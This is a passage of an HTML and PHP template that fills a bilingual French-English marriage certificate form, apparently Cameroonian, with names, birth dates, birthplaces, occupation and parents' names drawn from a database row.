<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:490px"></td>
<td style="width:4px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['DateIssued']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:16px">
<td colspan="3">
</td>
<td colspan="19">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:239px"></td>
<td style="width:150px"></td>
</tr>
<tr valign="top" style="height:16px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Devant nous ont comparu publiquement</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:221px"></td>
<td style="width:168px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Before us appeared publicly</span></td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="13">
</td>
</tr>
<tr valign="top" style="height:270px">
<td>
</td>
<td colspan="33">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:33px"></td>
<td style="width:524px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">M.</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:28px"></td>
<td style="width:50px"></td>
<td style="width:480px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Mr</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:470px"></td>
<td style="width:28px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:470px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:9px"></td>
<td style="width:427px"></td>
<td style="width:34px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $row['BgName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:250px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:88px"></td>
<td style="width:408px"></td>
<td style="width:62px"></td>
</tr>
<tr valign="top" style="height:99px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BrName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:546px"></td>
<td style="width:12px"></td>
</tr>
<tr valign="top" style="height:109px">
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:498px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Né le</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:39px"></td>
<td style="width:62px"></td>
<td style="width:6px"></td>
<td style="width:152px"></td>
<td style="width:299px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Born on the</span></td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td colspan="2" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:102px"></td>
<td style="width:164px"></td>
<td style="width:292px"></td>
</tr>
<tr valign="top" style="height:25px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BgDOB']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:260px"></td>
<td style="width:271px"></td>
<td style="width:27px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:31px"></td>
<td style="width:240px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:14px"></td>
<td style="width:257px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:33px"></td>
<td style="width:224px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- at</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:24px"></td>
<td style="width:233px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BgPOB']; ?></span></td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:89px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:76px"></td>
<td style="width:233px"></td>
<td style="width:237px"></td>
<td style="width:12px"></td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:16px">
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:21px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Nationalité</span></td>
<td colspan="3">
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:68px"></td>
<td style="width:75px"></td>
<td style="width:415px"></td>
</tr>
<tr valign="top" style="height:17px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Nationality</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:151px"></td>
<td style="width:404px"></td>
<td style="width:2px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:81px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Profession</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:69px"></td>
<td style="width:82px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Occupation</span></td>
</tr>
</table>
</div>
</div>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:4px"></td>
<td style="width:400px"></td>
</tr>
<tr valign="top" style="height:17px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:378px"></td>
<td style="width:26px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BgOcc']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:69px">
<td colspan="4">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:141px"></td>
<td style="width:413px"></td>
<td style="width:4px"></td>
</tr>
<tr valign="top" style="height:16px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:145px"></td>
<td style="width:306px"></td>
<td style="width:107px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Cameroonian</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:558px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
</tr>
<tr valign="top" style="height:53px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:80px"></td>
<td style="width:478px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Domicilié à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:557px"></td>
</tr>
<tr valign="top" style="height:53px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:71px"></td>
<td style="width:82px"></td>
<td style="width:404px"></td>
</tr>
<tr valign="top" style="height:15px">
<td>
</td>
<td rowspan="3" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Resident at</span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:4px">
<td>
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:532px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:53px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:154px"></td>
<td style="width:378px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['BgName']; ?></span></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:210px"></td>
<td style="width:10px"></td>
<td style="width:210px"></td>
<td style="width:63px"></td>
<td style="width:26px"></td>
<td style="width:13px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:17px">
<td rowspan="4">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:42px"></td>
<td style="width:168px"></td>
</tr>
<tr valign="top" style="height:17px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Fils de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:210px"></td>
</tr>
<tr valign="top" style="height:5px">
<td>
</td>
</tr>
<tr valign="top" style="height:33px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:51px"></td>
<td style="width:159px"></td>
</tr>
<tr valign="top" style="height:14px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:19px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Son of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:39px"></td>
<td style="width:5px"></td>
<td style="width:162px"></td>
<td style="width:4px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td colspan="3" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $row['BgFName']; ?></span></td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="4">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
<td rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:42px"></td>
<td style="width:168px"></td>
</tr>
<tr valign="top" style="height:17px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Fils de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:210px"></td>
</tr>
<tr valign="top" style="height:5px">
<td>
</td>
</tr>
<tr valign="top" style="height:23px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:51px"></td>
<td style="width:159px"></td>
</tr>
<tr valign="top" style="height:4px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:19px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Son of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:39px"></td>
<td style="width:9px"></td>
<td style="width:162px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $row['BgMName']; ?></span></td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="3">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Dune part</span></td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:11px">
<td>
</td>
<td colspan="2" rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">On the one hand</span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:8px">
<td colspan="2">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:2px">
<td colspan="5">
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:140px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:91px"></td>
<td style="width:337px"></td>
<td style="width:118px"></td>
</tr>
<tr valign="top" style="height:120px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">&nbsp;les futures epoux declarent que le régime des biens est :</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:546px"></td>
</tr>
<tr valign="top" style="height:129px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:57px"></td>
<td style="width:488px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">et Meme</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:53px"></td>
<td style="width:50px"></td>
<td style="width:443px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- And </span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:88px"></td>
<td style="width:406px"></td>
<td style="width:52px"></td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:9px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:109px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:486px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Né le</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:39px"></td>
<td style="width:62px"></td>
<td style="width:6px"></td>
<td style="width:152px"></td>
<td style="width:287px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Was born on</span></td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td colspan="2" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
